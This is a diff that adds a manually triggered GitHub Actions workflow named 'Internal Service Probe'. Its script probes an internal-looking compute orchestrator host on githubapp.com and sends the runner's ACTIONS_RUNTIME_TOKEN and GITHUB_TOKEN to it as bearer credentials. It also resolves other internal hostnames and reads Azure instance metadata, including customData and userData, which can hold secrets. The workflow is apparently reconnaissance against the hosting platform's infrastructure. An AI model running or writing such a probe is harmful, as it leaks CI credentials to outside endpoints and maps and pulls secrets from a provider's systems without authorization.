@@ -1,0 +1,55 @@
+name: Internal Service Probe
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe internal services
+        run: |
+          echo "=== Hosted Compute Orchestrator ==="
+          # The URL from IMDS tags
+          for path in "/" "/vm/v1" "/vm/v1/health" "/vm/v1/status" "/health" "/healthz" "/.well-known/openid-configuration"; do
+            RESP=$(curl -s -w "\nHTTP:%{http_code}" --max-time 3 "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com${path}" 2>/dev/null)
+            HTTP=$(echo "$RESP" | tail -1)
+            BODY=$(echo "$RESP" | head -1)
+            echo "  ${path}: $HTTP - ${BODY:0:120}"
+          done
+          
+          echo ""
+          echo "=== With runtime token ==="
+          curl -s -w "\nHTTP:%{http_code}" --max-time 3 \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1" | head -3
+          
+          echo ""
+          echo "=== With GITHUB_TOKEN ==="
+          curl -s -w "\nHTTP:%{http_code}" --max-time 3 \
+            -H "Authorization: Bearer $GITHUB_TOKEN" \
+            "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1" | head -3
+          
+          echo ""
+          echo "=== Other internal hosts from DNS ==="
+          for host in \
+            "hosted-compute-request-orchestrator-prod-eus-01.githubapp.com" \
+            "hosted-compute-request-orchestrator-prod.githubapp.com" \
+            "actions-compute.githubapp.com" \
+            "hosted-compute.githubapp.com"; do
+            IP=$(dig +short "$host" 2>/dev/null | head -1)
+            if [ -n "$IP" ]; then
+              echo "  $host: $IP"
+            fi
+          done
+          
+          echo ""
+          echo "=== IMDS - scheduled events (Azure) ==="
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/scheduledevents?api-version=2019-08-01" | head -100
+          
+          echo ""
+          echo "=== IMDS - custom data ==="
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-02-01&format=text" | head -100
+          
+          echo ""
+          echo "=== IMDS - user data ==="
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text" | head -100
